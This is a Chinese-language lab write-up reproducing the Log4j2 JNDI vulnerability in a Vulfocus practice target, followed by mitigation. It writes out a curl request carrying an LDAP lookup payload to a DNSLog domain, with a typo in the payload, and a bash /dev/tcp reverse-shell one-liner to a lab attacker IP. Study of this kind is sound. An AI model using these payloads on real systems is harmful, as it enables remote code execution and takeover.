
# Log4j2 漏洞复现及修复

## 1. 进入 Vulfocus 平台

通过克隆资源中的仓库地址来搭建平台，启动 Vulfocus 环境，并找到 Log4j2 漏洞，启动该漏洞。

![启动 Vulfocus](./启动vulfocus.png)

## 2. 进入漏洞环境测试

成功启动漏洞后，获取漏洞的入口靶标并访问该地址，进入当前环境进行测试。

![Log4j 漏洞环境启动](./log4j漏洞环境启动.png)

## 3. 获取容器信息并访问

通过执行 `docker ps` 指令来获取容器的名称和 ID，进入该容器的环境，并将路径下的 `demo.jar` 文件拷贝到宿主机。

![容器名称](./容器名称.png)
![进入容器环境](./进入容器环境.png)
![克隆 .jar 包到宿主机](./克隆.jar包到宿主机.png)

## 4. 反编译与漏洞分析

使用反编译工具分析 `demo.jar` 文件中的源代码，找到潜在的漏洞部分代码。

![漏洞源码](./反编译源码.png)

### 漏洞代码分析

漏洞代码位于以下部分：

```java
logger.error("{}", payload);
logger.info("{}", payload);
```

该段代码容易导致 Log4j2 漏洞的触发。

## 5. 漏洞验证

### 手动验证漏洞

通过使用 DNSLog（dnslog.cn）生成随机域名来手动测试漏洞，并使用 `curl` 命令触发一次域名解析请求。

![获取 dns](./获取dns.png)
![触发域名解析请求](./触发域名解析请求.png)
![请求记录](./请求记录.png)

### 错误分析

在运行以下命令时，出现报错：

```bash
curl -X POST http://192.168.164.5:24645/he11o -d 'payload="$findi:ldap://ongzd7.dnslog.cn/asas}"'
```

经询问 AI 大模型后得知，漏洞入口靶标的端口不支持 POST 方法。于是修改命令并成功运行。

![报错分析](./报错分析.png)

## 6. 漏洞利用效果评估

### 反弹 Shell

通过在靶机中独立测试有效负载，成功连接攻击机并反弹 Shell，验证漏洞成功利用。

![反弹 shell](./反弹shell.png)

### 监听与获取 Flag

通过监听靶机的 `/tmp` 目录，成功获取包含漏洞 Flag 的文件。

![漏洞 flag](./漏洞flag.png)

### 反弹窗口连接报错分析

运行 `bash -i >& /dev/tcp/192.168.164.4/7777 0>&1` 时，出现了报错。进一步分析发现，bash 解释器的环境不支持该语法，导致了语法错误。

![负载测试报错分析](./负载测试报错分析.png)
![靶机测试有效负载报错](./靶机测试有效负载报错.png)

### 解决方案

将命令改为显式执行 `bash`，即可成功反弹 Shell。

## 7. 漏洞缓解并验证

修改漏洞环境变量后，重新解析 DNS 请求，验证更新的记录未生效，确认漏洞得到缓解。

![修改环境变量](./修改环境变量.png)
![验证变量修改](./验证变量修改.png)
![无解析请求](./无解析请求.png)

## 8. 漏洞修复与验证

对漏洞进行修复后，进行验证，确保漏洞已被彻底修复。
